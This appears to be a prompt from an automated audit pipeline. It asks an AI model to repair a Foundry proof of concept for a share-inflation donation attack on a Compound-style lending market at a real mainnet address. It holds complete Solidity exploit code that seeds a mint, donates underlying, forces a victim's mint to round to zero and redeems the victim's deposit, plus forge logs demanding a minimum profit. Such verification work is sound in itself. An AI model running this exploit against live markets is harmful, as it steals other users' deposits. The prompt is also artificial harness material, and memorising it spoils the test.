You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Direct underlying donations can inflate the exchange rate until later minters receive zero shares
- claim: The market prices shares from the raw underlying balance via `getCashPrior()`, so unsolicited token transfers raise the exchange rate without minting new oTokens. `mintFresh()` then computes `mintTokens = floor(actualMintAmount / exchangeRate)` and never rejects `mintTokens == 0`, allowing a seeded holder to donate enough underlying that a later depositor transfers assets in but receives no shares.
- impact: A permissionless attacker can steal later deposits on thin or freshly seeded markets. After becoming the only shareholder and donating underlying directly to the market, the attacker can force a victim mint to round to zero and then redeem the victim's deposited assets together with the donation.
- exploit_paths: ["Attacker mints a minimal amount to become the only oToken holder", "Attacker transfers underlying directly to the oToken contract, increasing `getCashPrior()` without increasing `totalSupply`", "Victim calls `mint()` and `mintTokens` truncates to 0", "Attacker redeems their existing shares and withdraws both their donation and the victim's deposit"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOErc20Like {
    function underlying() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

contract VictimMinter {
    function supplyAndMint(address underlying, address market, uint256 amount) external {
        _forceApprove(underlying, market, 0);
        _forceApprove(underlying, market, amount);

        uint256 err = IOErc20Like(market).mint(amount);
        require(err == 0, "victim mint failed");
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

contract FlawVerifier {
    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);

    bool public attempted;
    bool public hypothesisValidated;
    uint256 public seedAmountUsed;
    uint256 public donationAmountUsed;
    uint256 public victimMintAmountUsed;
    uint256 public attackerSharesBeforeRedeem;
    string public lastFailureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address underlying = TARGET.underlying();
        _profitToken = underlying;

        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        uint256 existingSupply = TARGET.totalSupply();

        // Path stage 1 requires the attacker to become the only oToken holder.
        // If the market already has any live supply on the fork, this strict exploit path is mechanically blocked:
        // the verifier cannot invalidate or confiscate third-party oTokens without deviating to a different attack.
        if (existingSupply != 0) {
            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
            _profitAmount = 0;
            return;
        }

        // With no preexisting victim funds available to this verifier, a flashloan-only version of this path is not
        // profit-making: the donation and the later zero-share mint would both be attacker-funded, and the redemption
        // only returns that same capital back before flashloan fees. The direct strategy therefore needs real
        // verifier-held underlying to even execute the four-stage path on this harness.
        if (initialUnderlyingBalance == 0) {
            lastFailureReason =
                "verifier holds no underlying; flashloan-only funding is neutral-to-negative without third-party victim funds";
            _profitAmount = 0;
            return;
        }

        uint256 seed = _minimumSeedAmount();
        if (seed == 0 || seed > initialUnderlyingBalance) {
            lastFailureReason = "insufficient underlying for initial attacker seed mint";
            _profitAmount = 0;
            return;
        }

        _forceApprove(underlying, address(TARGET), 0);
        _forceApprove(underlying, address(TARGET), type(uint256).max);

        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
        uint256 mintErr = TARGET.mint(seed);
        if (mintErr != 0) {
            lastFailureReason = "seed mint failed";
            _profitAmount = 0;
            return;
        }
        seedAmountUsed = seed;

        uint256 attackerShares = TARGET.balanceOf(address(this));
        attackerSharesBeforeRedeem = attackerShares;
        if (attackerShares == 0) {
            lastFailureReason = "seed mint returned zero attacker shares";
            _profitAmount = 0;
            return;
        }

        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
        uint256 victimDeposit = 1;

        // After the seed mint, exchangeRate = (seed + donation) / shares.
        // To make the later victim mint truncate to zero, we need:
        // victimDeposit * 1e18 / exchangeRate < 1
        // => seed + donation > victimDeposit * shares.
        uint256 donationNeeded;
        if (attackerShares * victimDeposit >= seed) {
            donationNeeded = (attackerShares * victimDeposit) - seed + 1;
        } else {
            donationNeeded = 1;
        }

        // The strict path needs both a direct donation and a later victim deposit. If the verifier cannot fund both
        // legs locally, there is no way to make this harness produce positive profit without introducing an unrelated
        // victim source.
        if (remainingUnderlying < donationNeeded + victimDeposit) {
            lastFailureReason =
                "insufficient underlying to fund both the direct donation and the later zero-share victim mint";
            _profitAmount = 0;
            return;
        }

        // Path stage 2: attacker transfers underlying directly to the oToken contract.
        _safeTransfer(underlying, address(TARGET), donationNeeded);
        donationAmountUsed = donationNeeded;

        VictimMinter victim = new VictimMinter();
        _safeTransfer(underlying, address(victim), victimDeposit);
        victimMintAmountUsed = victimDeposit;

        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
        uint256 cashBeforeVictimMint = TARGET.getCash();

        // Path stage 3: a distinct victim address calls mint(), but rounding should assign zero oTokens.
        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);

        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
        uint256 cashAfterVictimMint = TARGET.getCash();
        if (victimSharesAfter != victimSharesBefore) {
            lastFailureReason = "victim received non-zero shares; zero-share mint condition not reached";
            _profitAmount = 0;
            return;
        }
        if (cashAfterVictimMint <= cashBeforeVictimMint) {
            lastFailureReason = "victim mint did not increase market cash";
            _profitAmount = 0;
            return;
        }

        // Path stage 4: attacker redeems their existing shares and withdraws the donation plus the victim deposit.
        uint256 redeemErr = TARGET.redeem(attackerShares);
        if (redeemErr != 0) {
            lastFailureReason = "attacker redeem failed";
            _profitAmount = 0;
            return;
        }

        hypothesisValidated = true;

        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        if (finalUnderlyingBalance > initialUnderlyingBalance) {
            _profitAmount = finalUnderlyingBalance - initialUnderlyingBalance;
        } else {
            _profitAmount = 0;
        }

        if (_profitAmount == 0) {
            lastFailureReason =
                "strict path mechanics validated, but no positive net profit exists without third-party victim funds";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _minimumSeedAmount() internal view returns (uint256) {
        uint256 exchangeRate = TARGET.exchangeRateStored();
        uint256 seed = exchangeRate / 1e18;
        if (exchangeRate % 1e18 != 0) {
            seed += 1;
        }
        if (seed == 0) {
            seed = 1;
        }
        return seed;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.59s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 206060)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x6982508145454Ce325dDbE47a25d4ec3d2311933
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 4517

Traces:
  [206060] FlawVerifierTest::testExploit()
    ├─ [2346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [169226] FlawVerifier::executeOnOpportunity()
    │   ├─ [2486] 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750::underlying() [staticcall]
    │   │   └─ ← [Return] 0x6982508145454Ce325dDbE47a25d4ec3d2311933
    │   ├─ [2624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2374] 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750::totalSupply() [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [346] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6982508145454Ce325dDbE47a25d4ec3d2311933
    ├─ [344] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6982508145454Ce325dDbE47a25d4ec3d2311933)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18476512 [1.847e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 4517)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.52s (386.21ms CPU time)

Ran 1 test suite in 3.60s (3.52s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 206060)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
